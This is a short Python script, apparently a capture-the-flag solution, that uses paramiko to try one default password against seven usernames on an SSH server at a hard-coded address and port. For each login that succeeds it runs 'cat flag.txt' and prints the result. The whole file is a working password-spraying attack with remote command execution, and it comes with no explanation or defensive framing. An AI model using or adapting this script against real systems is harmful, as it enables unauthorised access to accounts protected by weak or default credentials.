#!/usr/bin/env python3
from paramiko import *
import time

host = '18.205.162.101'
port = 8622

password = 'defaultpw5678!'
command = 'cat flag.txt'

usernames = [
    'ccastillo',
    'cshackleford',
    'duselton',
    'sjaggers',
    'mbooker',
    'cwallace',
    'wcoldwater'
]

client = SSHClient()
client.set_missing_host_key_policy(AutoAddPolicy())

for username in usernames:
    try:
        client.connect(host, port = port, username = username, password = password)
        
        stdin, stdout, stderr = client.exec_command(command)
        time.sleep(5)
        
        flag = ''.join(stdout.readlines())
        print('flag:', flag)
        
        client.close()
    except AuthenticationException as error:
        pass